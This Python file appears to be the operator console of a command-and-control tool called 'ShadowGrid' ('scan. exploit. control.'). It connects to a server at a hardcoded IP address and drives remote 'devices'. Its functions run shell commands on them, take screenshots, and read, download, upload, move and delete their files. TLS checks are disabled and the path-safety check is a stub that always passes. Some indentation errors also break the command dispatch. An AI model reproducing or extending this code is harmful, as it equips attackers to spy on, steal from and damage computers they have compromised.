import urllib.request
import json
import os
import sys
import time
import base64
import getpass
import requests
import ssl

SERVER_URL = None
SESSION_AUTH = None
SERVER_HOST = "0.0.0.0"
SERVER_PORT = 8000
CLIENT_ID = None
CLIENT_HOSTNAME = None
clients = {}
current_device = None
current_hostname = ""
current_platform = sys.platform
if current_platform == "win32":
    current_path = os.getcwd().replace('/', '\\')
else:
    current_path = os.getcwd()

RESET = "\033[0m"
GREEN = "\033[92m"
BLUE = "\033[94m"
YELLOW = "\033[93m"
timestamp = time.strftime("%Y%m%d_%H%M%S")

def prompt_config():
    global SERVER_URL
    print("[Setup] Enter server URL (e.g., https://113.45.254.80:8444):")
    SERVER_URL = input("> ").strip()
    if not SERVER_URL:
        SERVER_URL = "https://113.45.254.80:8444"
    print(f"[Setup] Using server: {SERVER_URL}")


def login():
    global SESSION_AUTH
    print("[Login] Enter password:")
    password = getpass.getpass("> ")
    try:
        auth_b64 = base64.b64encode(f"admin:{password}".encode()).decode()
        response = requests.post(
            f"{SERVER_URL}/login",
            headers={"Authorization": f"Basic {auth_b64}"},
            verify=False,
            timeout=10
        )
        if response.status_code == 200:
            data = response.json()
            if data.get("status") == "ok":
                print("[Login] Authentication successful")
                SESSION_AUTH = ("admin", password)
                return True
            else:
                print("[Login] Authentication failed")
                return False
        else:
            print(f"[Login] HTTP {response.status_code}")
            return False
    except Exception as e:
        print(f"[Login] Error: {e}")
        return False


def req(method, endpoint, data=None):
    global SESSION_AUTH
    url = f"{SERVER_URL}{endpoint}"
    headers = {"Content-Type": "application/json"}
    body = json.dumps(data).encode() if data else None
    try:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        request = urllib.request.Request(url, data=body, headers=headers, method=method)
        if SESSION_AUTH:
            auth_str = f"{SESSION_AUTH[0]}:{SESSION_AUTH[1]}"
            auth_b64 = base64.b64encode(auth_str.encode()).decode()
            request.add_header("Authorization", f"Basic {auth_b64}")
            
        with urllib.request.urlopen(request, context=context, timeout=10.0) as response:
            result = json.loads(response.read().decode())
            
            return result
    except Exception as e:
        
        return {"error": str(e)}

def fetch_clients():
    global clients
    try:
        resp = req("GET", "/clients")
        clients = resp.get("clients", [])
        return clients
    except Exception as e:
        print(f"[Error] Fetch clients failed: {e}")
        return []


def print_clients():
    if not clients:
        print("[Info] No connected devices")
        return
    print("\n[Info] Available devices:")
    for idx, client in enumerate(clients, 1):
        cid = client.get("id", "unknown")
        hostname = client.get("hostname", "unknown")
        ip = client.get("ip", "unknown")
        print(f"  {idx}. {hostname} ({ip}) [ID: {cid}]")
    print()

def send_command(client_id, cmd_type, payload=None):
    time.sleep(0.1)  
    try:
        data = {"type": cmd_type}
        if payload is not None:
            data["payload"] = payload
        resp = req("POST", f"/command/{client_id}", data)
        return resp
    except Exception as e:
        return {"error": str(e)}

def normalize_path(path):
    if os.path.isabs(path):
        return os.path.normpath(path)
    else:
        return os.path.normpath(os.path.join(current_path, path))

def is_safe_path(base_path, requested_path):
   
    return True

def ensure_dir(directory):
    if not os.path.exists(directory):
        os.makedirs(directory, exist_ok=True)

def get_results(client_id):
    try:
        resp = req("GET", f"/results/{client_id}")
        return resp.get("results", [])
    except Exception as e:
        return [{"error": str(e)}]

def wait_for_result(client_id, timeout=0.8):
    start_time = time.time()
    while time.time() - start_time < timeout:
        results = get_results(client_id)
        if results:
            return results
        time.sleep(0.02)  # 从 0.5 改为 0.1
    return None


def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def print_help():
    print("\n可用命令：")
    print(f"  {YELLOW}list{RESET}              列出所有可用设备")
    print(f"  {YELLOW}use <编号>{RESET}          选择设备（按编号）")
    print(f"  {YELLOW}back{RESET}              返回设备列表")
    print(f"  {YELLOW}clear{RESET}             清屏")
    print(f"  {YELLOW}help{RESET}              显示帮助信息")
    print(f"  {YELLOW}quit{RESET}              退出程序")
    print("")
    print("交互命令（选择设备后）：")
    print(f"  {YELLOW}ls [路径]{RESET}         列出目录内容")
    print(f"  {YELLOW}cd <目录>{RESET}         切换目录")
    print(f"  {YELLOW}pwd{RESET}               显示当前目录")
    print(f"  {YELLOW}cat <文件>{RESET}        显示文件内容")
    print(f"  {YELLOW}dl <文件> [目录]{RESET}   下载文件")
    print(f"  {YELLOW}ud <文件> [目录]{RESET}   上传文件")
    print(f"  {YELLOW}rm <路径> [-r]{RESET}    删除文件/目录")
    print(f"  {YELLOW}mv <源> <目标>{RESET}    移动/重命名")
    print(f"  {YELLOW}file <路径>{RESET}       查看文件类型")
    print(f"  {YELLOW}find <模式> [-t]{RESET}  查找文件")
    print(f"  {YELLOW}help{RESET}              显示帮助")
    print(f"  {YELLOW}back{RESET}              返回设备列表")
    print(f"  {YELLOW}quit{RESET}              退出")
    print("")

def format_ls_output(items):
    if not items:
        return
    for item in items:
        name = item.get("name", "")
        is_dir = item.get("dir", False)
        if is_dir:
            print(f"{GREEN}{name}{RESET}/")
        else:
            print(f"  {name}")
    
    
def print_failed_result(r):
    err = r.get("error", "")
    result = r.get("result", "")
    if err:
        print(f"[错误] {err}")
    elif isinstance(result, str):
        print(f"[结果] {result}")

def interaction_loop(client_id, hostname):
    global current_device, current_hostname, current_path
    current_device = client_id
    current_hostname = hostname
    current_path = os.getcwd().replace('/', '\\')
    print(f"[信息] 已连接到设备: {hostname} (ID: {client_id})")
    print(f"[信息] 输入 'back' 返回设备列表")
    print(f"[信息] 输入 'help' 查看可用命令")
    
    while True:
        try:
            prompt = f"{GREEN}{hostname}:{current_path}{RESET} > "
            cmd_input = input(prompt).strip()
        except EOFError:
            print("\n[信息] 退出中...")
            return
        except KeyboardInterrupt:
            print("\n[信息] 使用 'quit' 退出")
            continue
        
        if not cmd_input:
            continue
        
        parts = cmd_input.split(maxsplit=1)
        cmd = parts[0].lower()
        arg = parts[1] if len(parts) > 1 else None
        
        if cmd == "quit":
            print("[信息] 退出中...")
            sys.exit(0)
        elif cmd == "back":
            print("[信息] 返回设备列表中...")
            current_device = None
            current_hostname = ""
            return
        elif cmd == "clear":
            clear_screen()
        elif cmd == "help":
            print_help()
        elif cmd == "list":
            fetch_clients()
            print_clients()
        elif cmd == "shell":
            if arg is None:
                print("[错误] 用法: shell <命令>")
                continue
            send_command(client_id, "shell", arg)
        results = wait_for_result(client_id)
        if results:
            for r in results:
                result_type = r.get("result_type", "")
                result_data = r.get("result", "")
                if result_type == "shell":
                    print(f"[结果]\n{result_data}")
                elif result_type == "error":
                    print_failed_result(r)
                else:
                    print(f"[结果] {r}")

        elif cmd == "screenshot":
            send_command(client_id, "screenshot")
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    result_type = r.get("result_type", "")
                    if result_type == "screenshot":
                        img_data = r.get("result", "")
                        filename = r.get("filename", "shot.png")
                        try:
                            img_bytes = base64.b64decode(img_data)
                            os.makedirs("screenshots", exist_ok=True)
                            save_path = os.path.join("screenshots", f"{client_id}_{timestamp}_{filename}")
                            with open(save_path, "wb") as f:
                                f.write(img_bytes)
                            print(f"[结果] 截图已保存: {save_path}")
                        except Exception as e:
                            print(f"[错误] 无法保存截图: {e}")
                    elif result_type == "error":
                        print_failed_result(r)
                    else:
                        print(f"[结果] {r}")
        elif cmd == "ls":
            if arg:
                full_path = os.path.join(current_path, arg) if not os.path.isabs(arg) else arg
            else:
                full_path = current_path
            full_path = os.path.normpath(full_path)
            if not is_safe_path(current_path, full_path):
                                print("[Error] Invalid path: path traversal detected")
                                continue
            send_command(client_id, "ls", full_path)
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    result_data = r.get("result", [])
                    if isinstance(result_data, list):
                        format_ls_output(result_data)
                    else:
                        print_failed_result(r)
        elif cmd == "cat":
            if arg is None:
                print("[Error] Usage: cat <file_path>")
                continue
            full_path = os.path.join(current_path, arg) if not os.path.isabs(arg) else arg
            full_path = os.path.normpath(full_path)
            if not is_safe_path(current_path, full_path):
                                print("[Error] Invalid path: path traversal detected")
                                continue
            send_command(client_id, "cat", full_path)
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    result_type = r.get("result_type", "")
                    if result_type == "file":
                        file_data = r.get("result", "")
                        if file_data:
                            try:
                                decoded = base64.b64decode(file_data).decode()
                                print(f"[结果] {decoded}")
                            except Exception as e:
                                print(f"[错误] 解码失败: {e}")
                        else:
                            print("[错误] 文件为空")
                    elif result_type == "error":
                        print_failed_result(r)
                    else:
                        print(f"[结果] {r}")
        elif cmd == "cd":
            if arg is None:
                print("[Error] Usage: cd <dir>")
                continue
            full_path = os.path.join(current_path, arg) if not os.path.isabs(arg) else arg
            full_path = os.path.normpath(full_path)
            # Allow drive letter change (e.g., "D:", "C:")
            if len(full_path) == 2 and full_path[1] == ":" and full_path[0].upper() in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
                pass  # Allow drive change
            elif not is_safe_path(current_path, full_path):
                            print("[Error] Invalid path: path traversal detected")
                            continue
            send_command(client_id, "cd", full_path)
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    result_type = r.get("result_type", "")
                    if result_type == "dir":
                        current_path = full_path
                        print(f"[结果] 已切换到目录 {current_path}")
                    elif result_type == "error":
                        print_failed_result(r)
                    else:
                        print(f"[结果] {r}")
        elif cmd == "pwd":
            send_command(client_id, "pwd")
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    result_data = r.get("result", "")
                    print(f"[结果] {result_data}")
        elif cmd == "rm":
            if arg is None:
                print("[错误] 用法: rm <路径> [-r]")
                continue
            recursive = False
            actual_path = arg
            if arg.endswith(" -r"):
                actual_path = arg[:-3]
                recursive = True
            full_path = os.path.join(current_path, actual_path) if not os.path.isabs(actual_path) else actual_path
            full_path = os.path.normpath(full_path)
            if not is_safe_path(current_path, full_path):
                            print("[Error] Invalid path: path traversal detected")
                            continue
            send_command(client_id, "rm", {"path": full_path, "recursive": recursive})
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    result_type = r.get("result_type", "")
                    if result_type == "ok":
                        print(f"[结果] 删除成功")
                    elif result_type == "error":
                        print_failed_result(r)
                    else:
                        print(f"[结果] {r}")
        elif cmd == "mv":
            if arg is None:
                print("[错误] 用法: mv <源> <目标>")
                continue
            mv_parts = arg.split(maxsplit=1)
            if len(mv_parts) < 2:
                print("[错误] 用法: mv <源> <目标>")
                continue
            src_path, dst_path = mv_parts
            src_full = os.path.join(current_path, src_path) if not os.path.isabs(src_path) else src_path
            dst_full = os.path.join(current_path, dst_path) if not os.path.isabs(dst_path) else dst_path
            src_full = os.path.normpath(src_full)
            dst_full = os.path.normpath(dst_full)
            if not is_safe_path(current_path, src_full):
                                print("[错误] 无效的源路径: 检测到路径遍历")
                                continue
            if not is_safe_path(current_path, dst_full):
                                print("[错误] 无效的目标路径: 检测到路径遍历")
                                continue
            send_command(client_id, "mv", {"from_path": src_full, "to_path": dst_full})
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    result_type = r.get("result_type", "")
                    if result_type == "ok":
                        print(f"[结果] 移动/重命名成功")
                    elif result_type == "error":
                        print_failed_result(r)
                    else:
                        print(f"[结果] {r}")
        elif cmd == "file":
            if arg is None:
                print("[错误] 用法: file <路径>")
                continue
            full_path = os.path.join(current_path, arg) if not os.path.isabs(arg) else arg
            full_path = os.path.normpath(full_path)
            if not is_safe_path(current_path, full_path):
                            print("[Error] Invalid path: path traversal detected")
                            continue
            send_command(client_id, "file", {"path": full_path})
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    result_type = r.get("result_type", "")
                    if result_type == "file":
                        file_type = r.get("result", "")
                        print(f"[结果] 文件类型: {file_type}")
                    elif result_type == "error":
                        print_failed_result(r)
                    else:
                        print(f"[结果] {r}")
        elif cmd == "find":
            if arg is None:
                print("[错误] 用法: find <模式> [-t]")
                continue
            find_parts = arg.split()
            pattern = None
            file_type = None
            i = 0
            while i < len(find_parts):
                if find_parts[i] == "-t":
                    if i + 1 < len(find_parts):
                        file_type = find_parts[i + 1]
                        if file_type not in ["f", "d"]:
                            print("[错误] 无效类型: 必须是 'f' 或 'd'")
                            break
                        i += 1
                else:
                    if pattern is None:
                        pattern = find_parts[i]
                i += 1
            if pattern is None:
                print("[错误] 用法: find <模式> [-t]")
                continue
            full_path = os.path.join(current_path, pattern) if not os.path.isabs(pattern) else pattern
            full_path = os.path.normpath(full_path)
            if not is_safe_path(current_path, full_path):
                            print("[Error] Invalid path: path traversal detected")
                            continue
            send_command(client_id, "find", {"path": full_path, "name": pattern, "type": file_type if file_type else None})
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    result_type = r.get("result_type", "")
                    if result_type == "list":
                        items = r.get("result", [])
                        if items:
                            for item in items:
                                p = item.get("path", "")
                                t = item.get("type", "")
                                print(f"  [{t.upper()}] {p}")
                        else:
                            print("[结果] 未找到匹配项")
                    elif result_type == "error":
                        print_failed_result(r)
                    else:
                        print(f"[结果] {r}")
        elif cmd == "dl":
            if arg is None:
                print("[错误] 用法: dl <文件路径> [保存目录]")
                continue
            dl_parts = arg.split(maxsplit=1)
            file_path = dl_parts[0]
            save_dir = dl_parts[1] if len(dl_parts) > 1 else "."
            full_path = os.path.join(current_path, file_path) if not os.path.isabs(file_path) else file_path
            full_path = os.path.normpath(full_path)
            if not is_safe_path(current_path, full_path):
                            print("[Error] Invalid path: path traversal detected")
                            continue
            save_dir = normalize_path(save_dir)
            ensure_dir(save_dir)
            send_command(client_id, "dl", {"path": file_path, "save_as": ""})
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    result_type = r.get("result_type", "")
                    if result_type == "file":
                        file_data = r.get("result", "")
                        filename = r.get("filename", "downloaded_file")
                        try:
                            file_bytes = base64.b64decode(file_data)
                            save_path = os.path.join(save_dir, filename)
                            with open(save_path, "wb") as f:
                                f.write(file_bytes)
                            print(f"[结果] 文件已下载: {save_path}")
                        except Exception as e:
                            print(f"[错误] 无法保存文件: {e}")
                    elif result_type == "error":
                        print_failed_result(r)
                    else:
                        print(f"[结果] {r}")
        elif cmd == "ud":
            if arg is None:
                print("[错误] 用法: ud <本地文件路径> [远程目录]")
                continue
            ud_parts = arg.split(maxsplit=1)
            local_file = ud_parts[0]
            remote_dir = ud_parts[1] if len(ud_parts) > 1 else "."
            if not os.path.isfile(local_file):
                print("[错误] 本地文件未找到")
                continue
            try:
                with open(local_file, "rb") as f:
                    base64_data = base64.b64encode(f.read()).decode()
                remote_path = os.path.join(current_path, remote_dir) if not os.path.isabs(remote_dir) else remote_dir
                remote_path = os.path.normpath(remote_path)
                if not is_safe_path(current_path, remote_path):
                            print("[Error] Invalid path: path traversal detected")
                            continue
                filename = os.path.basename(local_file)
                save_as = os.path.join(remote_path, filename) if os.path.isdir(remote_path) else remote_path
                send_command(client_id, "ud", {"base64_data": base64_data, "save_as": save_as})
                results = wait_for_result(client_id)
                if results:
                    for r in results:
                        result_type = r.get("result_type", "")
                        if result_type == "ok":
                            print(f"[结果] 文件上传成功")
                        elif result_type == "error":
                            print_failed_result(r)
                        else:
                            print(f"[结果] {r}")
            except Exception as e:
                print(f"[错误] 无法读取本地文件: {e}")
        else:
            print(f"[错误] 未知命令: {cmd}。使用 'help' 查看命令列表。")

def show_splash():
    splash = """
      _   _           _   _ 
     | \\ | |         | | (_)
  ___|  \\| | ___   __| |  _ 
 / _ \\ . ` |/ _ \\ / _` | | |
|  __/ |\\  | (_) | (_| | | |
 \\___|_| \\_|\\___/ \\__,_|_| |
                           _/ |
                          |__/ 
                        
      [ ShadowGrid v1.0 ]  by 帅丘

      scan. exploit. control.
"""
    print(splash)

def main():
    show_splash()
    print("[Info] ShadowGrid Admin Console v1.0")
    
    prompt_config()
    
    if not login():
        print("[Error] Login failed")
        sys.exit(1)
    
    print("[Info] Enter 'help' for commands")
    
    device_control_cmds = {"ls", "cd", "pwd", "cat", "dl", "ud", "rm", "mv", "file", "find"}
    
    while True:
        try:
            cmd_input = input("srt > ").strip()
        except EOFError:
            print("\n[信息] 退出中...")
            break
        except KeyboardInterrupt:
            print("\n[信息] 使用 'quit' 退出")
            continue
        
        if not cmd_input:
            continue
        
        parts = cmd_input.split(maxsplit=1)
        cmd = parts[0].lower()
        arg = parts[1] if len(parts) > 1 else None
        
        if cmd == "quit":
            print("[Info] Exiting...")
            break
        elif cmd == "help":
            print_help()
        elif cmd == "list":
            fetch_clients()
            print_clients()
        elif cmd == "use":
            if arg is None:
                print("[Error] Usage: use <number>")
                continue
            try:
                num = int(arg)
                if num < 1 or num > len(clients):
                    print(f"[Error] Invalid device number. Use 'list' to see devices.")
                    continue
                selected = clients[num - 1]
                interaction_loop(selected.get("id"), selected.get("hostname"))
            except ValueError:
                print("[Error] Invalid device number")
        elif cmd in device_control_cmds:
            print("[Error] Select a device first. Use 'use <number>'")
        elif cmd == "clear":
            clear_screen()
        else:
            print(f"[Error] Unknown command: {cmd}. Use 'help' for command list.")


if __name__ == "__main__":
    main()
